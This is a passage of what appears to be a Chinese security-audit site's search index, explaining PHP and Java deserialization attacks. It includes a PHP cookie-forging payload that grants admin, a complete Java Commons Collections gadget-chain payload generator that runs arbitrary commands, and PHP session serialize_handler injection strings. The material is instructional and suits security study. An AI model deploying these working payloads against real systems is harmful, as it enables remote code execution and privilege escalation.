\u5e94\u7528\u7684\u5e8f\u5217\u5316\u6570\u636e\u4ea4\u4e92\u63a5\u53e3\u540e\uff0c\u4fbf\u53ef\u4ee5\u5f00\u59cb\u8003\u8651\u5177\u4f53\u7684\u5229\u7528\u65b9\u6cd5\u4e86\u3002","title":"Java \u5e8f\u5217\u5316\u7279\u5f81"},{"location":"audit/java/#_1","text":"\u4e0b\u9762\u662f\u4e00\u6bb5\u4ee3\u7801\u662f PHP \u4ee3\u7801\u4e2d\u5c06\u5e8f\u5217\u5316\u6570\u636e\u4ee5 Cookie \u5f62\u5f0f\u5b58\u50a8\u7684\u5b9e\u4f8b\uff08user.php\uff09\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 <?php class User { public $username = '' ; private $is_admin = false ; function __construct ( $username ) { $this -> username = $username ; } function isAdmin () { return $this -> is_admin ; } } function initUser () { $user = new User ( 'Guest' ); $data = base64_encode ( serialize ( $user )); setCookie ( 'user' , $data , time () + 3600 ); echo '<script>location.href=\"./user.php\"</script>' ; } if ( isset ( $_COOKIE [ 'user' ])) { $user = unserialize ( base64_decode ( $_COOKIE [ 'user' ])); if ( $user ) { if ( $user -> isAdmin ()) { echo 'Welcome Come Back, Admninistrator.' ; } else { echo \"Hello, $user->username .\" ; } } else { initUser (); } } else { initUser (); } \u8fd9\u6bb5\u4ee3\u7801\u5c06\u7528\u6237\u4fe1\u606f\u4ee5 base64_encode(serialize($user)) \u7684\u5f62\u5f0f\u5b58\u50a8\u4e8e\u5ba2\u6237\u7aef\u7684 $_COOKIE['data'] \u91cc\uff0c\u5bf9\u5e8f\u5217\u5316\u654f\u611f\u7684\u90fd\u77e5\u9053\u53ef\u4ee5\u81ea\u5df1\u6784\u9020\u5e8f\u5217\u5316\u5185\u5bb9\u7136\u540e\u4f20\u9012\u7ed9\u670d\u52a1\u7aef\uff0c\u4f7f\u5176\u6539\u53d8\u4ee3\u7801\u903b\u8f91\u3002\u4f7f\u7528\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u751f\u6210 $is_admin = true \u7684\u7528\u6237\u4fe1\u606f\uff1a 1 2 3 4 5 6 7 <?php class User { public $username = 'Guest' ; private $is_admin = true ; } echo base64_encode ( serialize ( new User ())); \u7528\u751f\u6210\u597d\u7684 Payload \u4fee\u6539 Cookie \u540e\u518d\u6b21\u8bbf\u95ee\u5373\u53ef\u770b\u5230 Welcome Come Back, Admninistrator. \u7684\u8f93\u51fa\u4fe1\u606f\u3002 Java \u4e2d\u4e5f\u53ef\u4ee5\u5229\u7528\u53cd\u5e8f\u5217\u5316\u63a7\u5236\u4ee3\u7801\u6d41\u7a0b\uff08\u4f20\u64ad\u7684\u6bd5\u7adf\u662f\u4e00\u4e2a\u5bf9\u8c61\u5b9e\u4f8b\uff09\uff0c \u4f46\u5728 Java \u4e2d\u60f3\u8981\u968f\u4fbf\u53cd\u5e8f\u5217\u5316\u4e00\u4e2a\u7c7b\u5b9e\u4f8b\u662f\u4e0d\u884c\u7684\uff0c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u7684\u7c7b\u5fc5\u987b\u663e\u793a\u58f0\u660e Serializable \u63a5\u53e3\uff0c\u8fd9\u6837\u624d\u5141\u8bb8\u8fdb\u884c\u5e8f\u5217\u5316\u64cd\u4f5c\u3002","title":"\u53cd\u5e8f\u5217\u5316\u7684\u5371\u5bb3"},{"location":"audit/java/#_2","text":"\u9762\u5411\u5c5e\u6027\u7f16\u7a0b\uff08Property-Oriented Programing\uff09\u5e38\u7528\u4e8e\u4e0a\u5c42\u8bed\u8a00\u6784\u9020\u7279\u5b9a\u8c03\u7528\u94fe\u7684\u65b9\u6cd5\uff0c\u4e0e\u4e8c\u8fdb\u5236\u5229\u7528\u4e2d\u7684\u9762\u5411\u8fd4\u56de\u7f16\u7a0b\uff08Return-Oriented Programing\uff09\u7684\u539f\u7406\u76f8\u4f3c\uff0c\u90fd\u662f\u4ece\u73b0\u6709\u8fd0\u884c\u73af\u5883\u4e2d\u5bfb\u627e\u4e00\u7cfb\u5217\u7684\u4ee3\u7801\u6216\u8005\u6307\u4ee4\u8c03\u7528\uff0c\u7136\u540e\u6839\u636e\u9700\u6c42\u6784\u6210\u4e00\u7ec4\u8fde\u7eed\u7684\u8c03\u7528\u94fe\u3002\u5728\u63a7\u5236\u4ee3\u7801\u6216\u8005\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u540e\u5c31\u80fd\u591f\u4f7f\u7528\u8fd9\u4e00\u7ec4\u8c03\u7528\u94fe\u505a\u4e00\u4e9b\u5de5\u4f5c\u4e86\u3002","title":"\u9762\u5411\u5c5e\u6027\u7f16\u7a0b"},{"location":"audit/java/#java_1","text":"InvokerTransformer.transform() \u53cd\u5c04\u8c03\u7528 \u5728\u4f7f\u7528 Apache Commons Collections \u5e93\u8fdb\u884c Gadget \u6784\u9020\u65f6\u4e3b\u8981\u5229\u7528\u4e86\u5176 Transformer \u63a5\u53e3\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public interface Transformer { /** * Transforms the input object (leaving it unchanged) into some output object. * * @param input the object to be transformed, should be left unchanged * @return a transformed object * @throws ClassCastException (runtime) if the input is the wrong class * @throws IllegalArgumentException (runtime) if the input is invalid * @throws FunctorException (runtime) if the transform cannot be completed */ public Object transform ( Object input ); } \u4e3b\u8981\u7528\u4e8e\u5c06\u4e00\u4e2a\u5bf9\u8c61\u901a\u8fc7 transform \u65b9\u6cd5\u8f6c\u6362\u4e3a\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u800c\u5728\u5e93\u4e2d\u4f17\u591a\u5bf9\u8c61\u8f6c\u6362\u7684\u63a5\u53e3\u4e2d\u5b58\u5728\u4e00\u4e2a Invoker \u7c7b\u578b\u7684\u8f6c\u6362\u63a5\u53e3 InvokerTransformer \uff0c\u5e76\u4e14\u540c\u65f6\u8fd8\u5b9e\u73b0\u4e86 Serializable \u63a5\u53e3\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class InvokerTransformer implements Transformer , Serializable { ... \u7701\u7565 ... private final String iMethodName ; private final Class [] iParamTypes ; private final Object [] iArgs ; public Object transform ( Object input ) { if ( input == null ) { return null ; } try { Class cls = input . getClass (); // \u53cd\u5c04\u83b7\u53d6\u7c7b Method method = cls . getMethod ( iMethodName , iParamTypes ); // \u53cd\u5c04\u5f97\u5230\u5177\u6709\u5bf9\u5e94\u53c2\u6570\u7684\u65b9\u6cd5 return method . invoke ( input , iArgs ); // \u4f7f\u7528\u5bf9\u5e94\u53c2\u6570\u8c03\u7528\u65b9\u6cd5\uff0c\u5e76\u8fd4\u56de\u76f8\u5e94\u8c03\u7528\u7ed3\u679c } catch ( NoSuchMethodException ex ) { ... \u7701\u7565 ... \u53ef\u4ee5\u770b\u5230 InvokerTransformer \u7c7b\u4e2d\u5b9e\u73b0\u7684 transform() \u63a5\u53e3\u4f7f\u7528 Java \u53cd\u5c04\u673a\u5236\u83b7\u53d6\u53cd\u5c04\u5bf9\u8c61 input \u4e2d\u7684\u53c2\u6570\u7c7b\u578b\u4e3a iParamTypes \u7684\u65b9\u6cd5 iMethodName \uff0c\u7136\u540e\u4f7f\u7528\u5bf9\u5e94\u53c2\u6570 iArgs \u8c03\u7528\u83b7\u53d6\u7684\u65b9\u6cd5\uff0c\u5e76\u5c06\u6267\u884c\u7ed3\u679c\u8fd4\u56de\u3002\u7531\u4e8e\u5176\u5b9e\u73b0\u4e86 Serializable \u63a5\u53e3\uff0c\u56e0\u6b64\u5176\u4e2d\u7684\u4e09\u4e2a\u5fc5\u8981\u53c2\u6570 iMethodName \u3001 iParamTypes \u548c iArgs \u90fd\u662f\u53ef\u4ee5\u901a\u8fc7\u5e8f\u5217\u5316\u76f4\u63a5\u6784\u9020\u7684\uff0c\u4e3a\u547d\u4ee4\u6267\u884c\u521b\u9020\u7684\u51b3\u5b9a\u6027\u7684\u6761\u4ef6\u3002 \u7136\u540e\u8981\u60f3\u5229\u7528 InvokerTransformer \u7c7b\u4e2d\u7684 transform() \u6765\u8fbe\u5230\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff0c\u8fd8\u9700\u8981\u4e00\u4e2a\u5165\u53e3\u70b9\uff0c\u4f7f\u5f97\u5e94\u7528\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u80fd\u591f\u901a\u8fc7\u4e00\u6761\u8c03\u7528\u94fe\u6765\u89e6\u53d1 InvokerTransformer \u4e2d\u7684 transform() \u63a5\u53e3\u3002 \u7136\u800c\u5728 Apache Commons Collections \u91cc\u786e\u5b9e\u5b58\u5728\u8fd9\u6837\u7684\u8c03\u7528\uff0c\u5176\u4e00\u662f\u4f4d\u4e8e TransformedMap \u7c7b\u4e2d\u7684 checkSetValue() \u65b9\u6cd5\uff1a 1 2 3 4 5 6 7 public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable { ... \u7701\u7565 ... protected Object checkSetValue ( Object value ) { return valueTransformer . transform ( value ); } \u800c TransformedMap \u5b9e\u73b0\u4e86 Map \u63a5\u53e3\uff0c\u800c\u5728\u5bf9\u5b57\u5178\u952e\u503c\u8fdb\u884c setValue() \u64cd\u4f5c\u65f6\u4f1a\u8c03\u7528 valueTransformer.transform(value) \u3002 1 2 3 4 5 6 ... \u7701\u7565 ... public Object setValue ( Object value ) { value = parent . checkSetValue ( value ); return entry . setValue ( value ); } } \u597d\u7684\uff0c\u73b0\u5728\u5df2\u7ecf\u627e\u5230\u4e86\u53cd\u5c04\u8c03\u7528\u7684\u4e0a\u4e00\u6b65\u8c03\u7528\uff0c\u8fd9\u91cc\u4e3a\u4e86\u591a\u6b21\u8fdb\u884c\u591a\u6b21\u53cd\u5c04\u8c03\u7528\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u591a\u4e2a InvokerTransformer \u5b9e\u4f8b\u7ea7\u8054\u5728\u4e00\u8d77\u7ec4\u6210\u4e00\u4e2a ChainedTransformer \u5bf9\u8c61\uff0c\u5728\u5176\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u8fdb\u884c\u4e00\u4e2a\u7ea7\u8054 transform() \u8c03\u7528\uff1a 1 2 3 4 5 6 7 8 public class ChainedTransformer implements Transformer, Serializable { ...\u7701\u7565... public Object transform(Object object) { for (int i = 0; i < iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object; } \u73b0\u5728\u5df2\u7ecf\u53ef\u4ee5\u9020\u51fa\u4e00\u4e2a TransformedMap \u5b9e\u4f8b\uff0c\u5728\u5bf9\u5b57\u5178\u952e\u503c\u8fdb\u884c setValue() \u64cd\u4f5c\u65f6\u5019\u8c03\u6211\u4eec\u6784\u9020\u7684 ChainedTransformer \uff0c\u4e0b\u9762\u7ed9\u51fa\u793a\u4f8b\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package exserial.examples ; import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.map.TransformedMap ; import java.util.HashMap ; import java.util.Map ; public class SetValueToExec { public static void main ( String [] args ) throws Exception { String command = ( args . length != 0 ) ? args [ 0 ] : \"/bin/sh,-c,open /Applications/Calculator.app\" ; String [] execArgs = command . split ( \",\" ); Transformer [] transforms = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class []. class }, new Object [] { \"getRuntime\" , new Class [ 0 ]} ), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object []. class }, new Object [] { null , new Object [ 0 ]} ), new InvokerTransformer ( \"exec\" , new Class [] { String []. class }, new Object [] { execArgs } ) }; Transformer transformerChain = new ChainedTransformer ( transforms ); Map tempMap = new HashMap < String , Object >(); Map < String , Object > exMap = TransformedMap . decorate ( tempMap , null , transformerChain ); exMap . put ( \"1111\" , \"2222\" ); for ( Map . Entry < String , Object > exMapValue : exMap . entrySet ()) { exMapValue . setValue ( 1 ); } } } \u6839\u636e\u4e4b\u524d\u7684\u5206\u6790\uff0c\u5c06\u4e0a\u9762\u8fd9\u6bb5\u4ee3\u7801\u7f16\u8bd1\u8fd0\u884c\u540e\u4f1a\u9ed8\u8ba4\u4f1a\u5f39\u51fa\u8ba1\u7b97\u5668\uff0c\u5bf9\u4ee3\u7801\u8be6\u7ec6\u6267\u884c\u8fc7\u7a0b\u6709\u7591\u60d1\u7684\u53ef\u4ee5\u901a\u8fc7\u5355\u6b65\u8c03\u8bd5\u8fdb\u884c\u6d4b\u8bd5\uff1a \u7136\u540e\u6211\u4eec\u73b0\u5728\u53ea\u662f\u6d4b\u8bd5\u4e86\u4f7f\u7528 TransformedMap \u8fdb\u884c\u4efb\u610f\u547d\u4ee4\u6267\u884c\u800c\u5df2\uff0c\u8981\u60f3\u5728 Java \u5e94\u7528\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u4e2d\u89e6\u53d1\u8be5\u8fc7\u7a0b\u8fd8\u9700\u8981\u627e\u5230\u4e00\u4e2a\u7c7b\uff0c\u5b83\u80fd\u591f\u5728\u53cd\u5e8f\u5217\u5316\u8c03\u7528 readObject() \u7684\u65f6\u5019\u8c03\u7528 TransformedMap \u5185\u7f6e\u7c7b MapEntry \u4e2d\u7684 setValue() \u51fd\u6570\uff0c\u8fd9\u6837\u624d\u80fd\u6784\u6210\u4e00\u6761\u5b8c\u6574\u7684 Gadget \u8c03\u7528\u94fe\u3002\u6070\u597d\u5728 sun.reflect.annotation.AnnotationInvocationHandler \u7c7b\u5177\u6709 Map \u7c7b\u578b\u7684\u53c2\u6570\uff0c\u5e76\u4e14\u5728 readObject() \u65b9\u6cd5\u4e2d\u89e6\u53d1\u4e86\u4e0a\u9762\u6240\u63d0\u5230\u7684\u6240\u6709\u6761\u4ef6\uff0c\u5176\u6e90\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 private void readObject(java.io.ObjectInputStream s) { ...\u7701\u7565... for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class<?> memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue(new AnnotationTypeMismatchExceptionProxy(value.getClass() + \"[\" + value + \"]\").setMember(annotationType.members().get(name))); } } } } \u53ef\u4ee5\u6ce8\u610f\u5230 memberValue \u662f AnnotationInvocationHandler \u7c7b\u4e2d\u7c7b\u578b\u58f0\u660e\u4e3a Map<String, Object> \u7684\u6210\u5458\u53d8\u91cf\uff0c\u521a\u597d\u548c\u4e4b\u524d\u6784\u9020\u7684 TransformedMap \u7c7b\u578b\u76f8\u7b26\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 Java \u7684\u53cd\u5c04\u673a\u5236\u52a8\u6001\u7684\u83b7\u53d6 AnnotationInvocationHandler \u7c7b\uff0c\u4f7f\u7528\u7cbe\u5fc3\u6784\u9020\u597d\u7684 TransformedMap \u4f5c\u4e3a\u5b83\u7684\u5b9e\u4f8b\u5316\u53c2\u6570\uff0c\u7136\u540e\u5c06\u5b9e\u4f8b\u5316\u7684 AnnotationInvocationHandler \u8fdb\u884c\u5e8f\u5217\u5316\u5f97\u5230\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6700\u540e\u4f20\u9012\u7ed9\u5177\u6709\u76f8\u5e94\u73af\u5883\u7684\u5e8f\u5217\u5316\u6570\u636e\u4ea4\u4e92\u63a5\u53e3\u4f7f\u4e4b\u89e6\u53d1\u547d\u4ee4\u6267\u884c\u7684 Gadget\uff0c\u5b8c\u6574\u4ee3\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package exserial.payloads; import java.io.ObjectOutputStream; import java.util.Map; import java.util.HashMap; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import exserial.payloads.utils.Serializables; public class Commons1 { public static Object getAnnotationInvocationHandler(String command) throws Exception { String[] execArgs = command.split(\",\"); Transformer[] transforms = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer( \"getMethod\", new Class[] {String.class, Class[].class}, new Object[] {\"getRuntime\", new Class[0]} ), new InvokerTransformer( \"invoke\", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]} ), new InvokerTransformer( \"exec\", new Class[] {String[].class}, new Object[] {execArgs} ) }; Transformer transformerChain = new ChainedTransformer(transforms); Map tempMap = new HashMap(); tempMap.put(\"value\", \"does't matter\"); Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(Target.class, exMap); return instance; } public static void main(String[] args) throws Exception { String command = (args.length != 0) ? args[0] : \"/bin/sh,-c,open /Applications/Calculator.app\"; Object obj = getAnnotationInvocationHandler(command); ObjectOutputStream out = new ObjectOutputStream(System.out); out.writeObject(obj); } } \u6700\u7ec8\u7528\u4e00\u6bb5\u8c03\u7528\u94fe\u53ef\u4ee5\u6e05\u6670\u7684\u63cf\u8ff0\u6574\u4e2a\u547d\u4ee4\u6267\u884c\u7684\u89e6\u53d1\u8fc7\u7a0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() AbstractInputCheckedMapDecorator$MapEntry.setValue() TransformedMap.checkSetValue() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() Requires: commons-collections <= 3.2.1 */","title":"Java \u53cd\u5e8f\u5217\u5316\u5229\u7528"},{"location":"audit/java/#_3","text":"\u4e4c\u4e91","title":"\u53c2\u8003"},{"location":"audit/nodejs/","text":"\u53c2\u8003 \u00b6 https://github.com/PacktPublishing/Learn-Node.js-by-Building-6-Projects/blob/master/Chapter06/elearning/app.js","title":"Nodejs"},{"location":"audit/nodejs/#_1","text":"https://github.com/PacktPublishing/Learn-Node.js-by-Building-6-Projects/blob/master/Chapter06/elearning/app.js","title":"\u53c2\u8003"},{"location":"audit/php-challenge/","text":"php-challenge\u8bb0\u5f55 \u00b6","title":"php-challenge\u8bb0\u5f55"},{"location":"audit/php-challenge/#php-challenge","text":"","title":"php-challenge\u8bb0\u5f55"},{"location":"audit/phpSession/","text":"PHP Session \u5e8f\u5217\u5316\u53ca\u53cd\u5e8f\u5217\u5316\u5904\u7406\u5668\u8bbe\u7f6e\u4f7f\u7528\u4e0d\u5f53\u5e26\u6765\u7684\u5b89\u5168\u9690\u60a3 \u00b6 PHP \u5185\u7f6e\u4e86\u591a\u79cd\u5904\u7406\u5668\u7528\u4e8e\u5b58\u53d6 $_SESSION \u6570\u636e\u65f6\u4f1a\u5bf9\u6570\u636e\u8fdb\u884c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\uff0c\u5e38\u7528\u7684\u6709\u4ee5\u4e0b\u4e09\u79cd\uff0c\u5bf9\u5e94\u4e09\u79cd\u4e0d\u540c\u7684\u5904\u7406\u683c\u5f0f\uff1a \u5904\u7406\u5668 \u5bf9\u5e94\u7684\u5b58\u50a8\u683c\u5f0f php \u952e\u540d \uff0b \u7ad6\u7ebf \uff0b \u7ecf\u8fc7 serialize() \u51fd\u6570\u53cd\u5e8f\u5217\u5904\u7406\u7684\u503c php_binary \u952e\u540d\u7684\u957f\u5ea6\u5bf9\u5e94\u7684 ASCII \u5b57\u7b26 \uff0b \u952e\u540d \uff0b \u7ecf\u8fc7 serialize() \u51fd\u6570\u53cd\u5e8f\u5217\u5904\u7406\u7684\u503c php_serialize (php>=5.5.4) \u7ecf\u8fc7 serialize() \u51fd\u6570\u53cd\u5e8f\u5217\u5904\u7406\u7684\u6570\u7ec4 \u914d\u7f6e\u9009\u9879 session.serialize_handler \u00b6 PHP \u63d0\u4f9b\u4e86 session.serialize_handler \u914d\u7f6e\u9009\u9879\uff0c\u901a\u8fc7\u8be5\u9009\u9879\u53ef\u4ee5\u8bbe\u7f6e\u5e8f\u5217\u5316\u53ca\u53cd\u5e8f\u5217\u5316\u65f6\u4f7f\u7528\u7684\u5904\u7406\u5668\uff1a 1 session.serialize_handler \"php\" PHP_INI_ALL \u5b89\u5168\u9690\u60a3 \u00b6 \u901a\u8fc7\u4e0a\u9762\u5bf9\u5b58\u50a8\u683c\u5f0f\u7684\u5206\u6790\uff0c\u5982\u679c PHP \u5728\u53cd\u5e8f\u5217\u5316\u5b58\u50a8\u7684 $_SESSION \u6570\u636e\u65f6\u7684\u4f7f\u7528\u7684\u5904\u7406\u5668\u548c\u5e8f\u5217\u5316\u65f6\u4f7f\u7528\u7684\u5904\u7406\u5668\u4e0d\u540c\uff0c\u4f1a\u5bfc\u81f4\u6570\u636e\u65e0\u6cd5\u6b63\u786e\u53cd\u5e8f\u5217\u5316\uff0c\u901a\u8fc7\u7279\u6b8a\u7684\u6784\u9020\uff0c\u751a\u81f3\u53ef\u4ee5\u4f2a\u9020\u4efb\u610f\u6570\u636e\uff1a\uff09 1 $_SESSION['ryat'] = '|O:8:\"stdClass\":0:{}'; \u4f8b\u5982\u4e0a\u9762\u7684 $_SESSION \u6570\u636e\uff0c\u5728\u5b58\u50a8\u65f6\u4f7f\u7528\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e3a php_serialize\uff0c\u5b58\u50a8\u7684\u683c\u5f0f\u5982\u4e0b\uff1a 1 a:1:{s:4:\"ryat\";s:20:\"|O:8:\"stdClass\":0:{}\";} \u5728\u8bfb\u53d6\u6570\u636e\u65f6\u5982\u679c\u7528\u7684\u53cd\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e0d\u662f php_serialize\uff0c\u800c\u662f php \u7684\u8bdd\uff0c\u90a3\u4e48\u53cd\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\u5c06\u4f1a\u53d8\u6210\uff1a 1 2 3 4 5 6 // var_dump($_SESSION); array(1) { [\"a:1:{s:4:\"ryat\";s:20:\"\"]=> object(stdClass)#1 (0) { } } \u53ef\u4ee5\u770b\u5230\uff0c\u901a\u8fc7\u6ce8\u5165 | \u5b57\u7b26\u4f2a\u9020\u4e86\u5bf9\u8c61\u7684\u5e8f\u5217\u5316\u6570\u636e\uff0c\u6210\u529f\u5b9e\u4f8b\u5316\u4e86 stdClass \u5bf9\u8c61\uff1a\uff09 \u5b9e\u9645\u5229\u7528 \u00b6 \u5f53\u914d\u7f6e\u9009\u9879 session.auto_start\uff1dOn\uff0c\u4f1a\u81ea\u52a8\u6ce8\u518c Session \u4f1a\u8bdd\uff0c\u56e0\u4e3a\u8be5\u8fc7\u7a0b\u662f\u53d1\u751f\u5728\u811a\u672c\u4ee3\u7801\u6267\u884c\u524d\uff0c\u6240\u4ee5\u5728\u811a\u672c\u4e2d\u8bbe\u5b9a\u7684\u5305\u62ec\u5e8f\u5217\u5316\u5904\u7406\u5668\u5728\u5185\u7684 session \u76f8\u5173\u914d\u9009\u9879\u7684\u8bbe\u7f6e\u662f\u4e0d\u8d77\u4f5c\u7528\u7684\uff0c\u56e0\u6b64\u4e00\u4e9b\u9700\u8981\u5728\u811a\u672c\u4e2d\u8bbe\u7f6e\u5e8f\u5217\u5316\u5904\u7406\u5668\u914d\u7f6e\u7684\u7a0b\u5e8f\u4f1a\u5728 session.auto_start\uff1dOn \u65f6\uff0c\u9500\u6bc1\u81ea\u52a8\u751f\u6210\u7684 Session \u4f1a\u8bdd\uff0c\u7136\u540e\u8bbe\u7f6e\u9700\u8981\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\uff0c\u518d\u8c03\u7528 session_start() \u51fd\u6570\u6ce8\u518c\u4f1a\u8bdd\uff0c\u8fd9\u65f6\u5982\u679c\u811a\u672c\u4e2d\u8bbe\u7f6e\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e0e php.ini \u4e2d\u8bbe\u7f6e\u7684\u4e0d\u540c\uff0c\u5c31\u4f1a\u51fa\u73b0\u5b89\u5168\u95ee\u9898\uff0c\u5982\u4e0b\u9762\u7684\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 //foo.php if (ini_get('session.auto_start')) { session_destroy(); } ini_set('session.serialize_handler', 'php_serialize'); session_start(); $_SESSION['ryat'] = $_GET['ryat']; \u5f53\u7b2c\u4e00\u6b21\u8bbf\u95ee\u8be5\u811a\u672c\uff0c\u5e76\u63d0\u4ea4\u6570\u636e\u5982\u4e0b\uff1a 1 foo.php?ryat=|O:8:\"stdClass\":0:{} \u811a\u672c\u4f1a\u6309\u7167 php_serialize \u5904\u7406\u5668\u7684\u5e8f\u5217\u5316\u683c\u5f0f\u5b58\u50a8\u6570\u636e\uff1a 1 a:1:{s:4:\"ryat\";s:20:\"|O:8:\"stdClass\":0:{}\";} \u5f53\u7b2c\u4e8c\u6b21\u8bbf\u95ee\u8be5\u811a\u672c\u65f6\uff0cPHP \u4f1a\u6309\u7167 php.ini \u91cc\u8bbe\u7f6e\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u53cd\u5e8f\u5217\u5316\u5b58\u50a8\u7684\u6570\u636e\uff0c\u8fd9\u65f6\u5982\u679c php.ini \u91cc\u8bbe\u7f6e\u7684\u662f php \u5904\u7406\u5668\u7684\u8bdd\uff0c\u5c06\u4f1a\u53cd\u5e8f\u5217\u5316\u4f2a\u9020\u7684\u6570\u636e\uff0c\u6210\u529f\u5b9e\u4f8b\u5316\u4e86 stdClass \u5bf9\u8c61\uff1a\uff09 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u56e0\u4e3a PHP \u81ea\u52a8\u6ce8\u518c Session \u4f1a\u8bdd\u662f\u5728\u811a\u672c\u6267\u884c\u524d\uff0c\u6240\u4ee5\u901a\u8fc7\u8be5\u65b9\u5f0f\u53ea\u80fd\u6ce8\u5165 PHP \u7684\u5185\u7f6e\u7c7b\u3002 ii\uff09\u5f53 session.auto_start\uff1dOff \u65f6\uff1a \u00b6 \u5f53\u914d\u7f6e\u9009\u9879 session.auto_start\uff1dOff\uff0c\u4e24\u4e2a\u811a\u672c\u6ce8\u518c Session \u4f1a\u8bdd\u65f6\u4f7f\u7528\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e0d\u540c\uff0c\u5c31\u4f1a\u51fa\u73b0\u5b89\u5168\u95ee\u9898\uff0c\u5982\u4e0b\u9762\u7684\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 //foo1.php ini_set('session.serialize_handler', 'php_serialize'); session_start(); $_SESSION['ryat'] = $_GET['ryat']; //foo2.php ini_set('session.serialize_handler', 'php'); //or session.serialize_handler set to php in php.ini session_start(); class ryat { var $hi; function __wakeup() { echo 'hi'; } function __destruct() { echo $this->hi; } } \u5f53\u8bbf\u95ee foo1.php \u65f6\uff0c\u63d0\u4ea4\u6570\u636e\u5982\u4e0b\uff1a 1 foo1.php?ryat=|O:4:\"ryat\":1:{s:2:\"hi\";s:4:\"ryat\";} \u811a\u672c\u4f1a\u6309\u7167 php_serialize \u5904\u7406\u5668\u7684\u5e8f\u5217\u5316\u683c\u5f0f\u5b58\u50a8\u6570\u636e\uff0c\u8bbf\u95ee foo2.php \u65f6\uff0c\u5219\u4f1a\u6309\u7167 php \u5904\u7406\u5668\u7684\u53cd\u5e8f\u5217\u5316\u683c\u5f0f\u8bfb\u53d6\u6570\u636e\uff0c\u8fd9\u65f6\u5c06\u4f1a\u53cd\u5e8f\u5217\u5316\u4f2a\u9020\u7684\u6570\u636e\uff0c\u6210\u529f\u5b9e\u4f8b\u5316\u4e86 ryat \u5bf9\u8c61\uff0c\u5e76\u5c06\u4f1a\u6267\u884c\u7c7b\u4e2d\u7684 __wakeup \u65b9\u6cd5\u548c __destruct \u65b9\u6cd5\uff1a\uff09 \u53c2\u8003 \u00b6 \u4e4c\u4e91","title":"PHP Session \u5e8f\u5217\u5316\u53ca\u53cd\u5e8f\u5217\u5316\u5904\u7406\u5668\u8bbe\u7f6e\u4f7f\u7528\u4e0d\u5f53\u5e26\u6765\u7684\u5b89\u5168\u9690\u60a3"},{"location":"audit/phpSession/#php-session","text":"PHP \u5185\u7f6e\u4e86\u591a\u79cd\u5904\u7406\u5668\u7528\u4e8e\u5b58\u53d6 $_SESSION \u6570\u636e\u65f6\u4f1a\u5bf9\u6570\u636e\u8fdb\u884c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\uff0c\u5e38\u7528\u7684\u6709\u4ee5\u4e0b\u4e09\u79cd\uff0c\u5bf9\u5e94\u4e09\u79cd\u4e0d\u540c\u7684\u5904\u7406\u683c\u5f0f\uff1a \u5904\u7406\u5668 